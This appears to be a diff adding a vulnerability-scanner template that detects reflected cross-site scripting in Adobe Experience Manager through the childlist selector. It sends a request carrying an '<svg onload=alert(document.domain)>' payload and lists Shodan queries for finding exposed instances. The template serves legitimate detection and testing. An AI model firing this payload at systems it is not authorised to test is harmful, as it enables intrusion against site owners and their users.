@@ -1,0 +1,44 @@
+id: aem-xss-childlist-selector
+
+info:
+  name: Adobe Experience Manager - Cross-Site Scripting
+  author: dhiyaneshDk
+  severity: high
+  description: |
+    Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the selector childlist when the dispatcher does not respect the content-type responded by AEM and flips from application/json to text/html. As a consequence, the reflected suffix is executed and interpreted in the browser.
+  reference:
+    - https://github.com/thomashartm/burp-aem-scanner/blob/master/src/main/java/burp/actions/xss/FlippingTypeWithChildrenlistSelector.java
+    - https://cystack.net/en/plugins/cystack.remote.aem_childlist_selector_xss
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+    shodan-query:
+      - http.title:"AEM Sign In"
+      - http.component:"Adobe Experience Manager"
+  tags: xss,aem,adobe,misconfig
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<svg onload=alert(document.domain)>'
+          - '{"path":"/etc/designs/xh1x.childrenlist.json'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100a5544c78b5883db4120ddcf55712524f4e151de884850a42803938fefe961170022100946d4195095e6b6f194f3cedd4f1f0eba11ca4e5e2735235b548185b8df75d64:922c64590222798bb761d5b6d8e72950
